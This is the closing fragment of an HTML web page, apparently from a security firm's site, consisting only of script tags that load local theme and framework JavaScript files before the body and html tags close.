<script src="../../sites/default/files/js/js_rH9qvc17Djv2iaAUXQJ2-8q5ixokQ54RnsB7e-Qbb7M.js"></script>
<script src="../../themes/synacktiv/js/bootstrap.min.js"></script>
<script defer="" src="../../themes/synacktiv/js/cookiebanner.script.js"></script>
<script defer="" src="../../themes/synacktiv/js/custom.js"></script>
<script defer="" src="../../themes/synacktiv/js/swiper.js"></script>
<script src="../../sites/default/files/js/js_JP_x-sbRzkzG4QidGa5FeaACScdu33oppQ2UimueYro.js"></script>
<script defer="" src="../../themes/synacktiv/js/addtoany.js"></script>
<script defer="" src="../../themes/synacktiv/js/katex.js"></script>
<script defer="" src="../../themes/synacktiv/js/katex-autoloader.js"></script>
<script defer="" src="../../themes/synacktiv/js/zoom.min.js"></script>
<script src="../../sites/default/files/js/js_afLzLLMCXuLWKjfsfRcX9ld1UTdhWte08w7Epc7bG8g.js"></script>
</body>
</html>
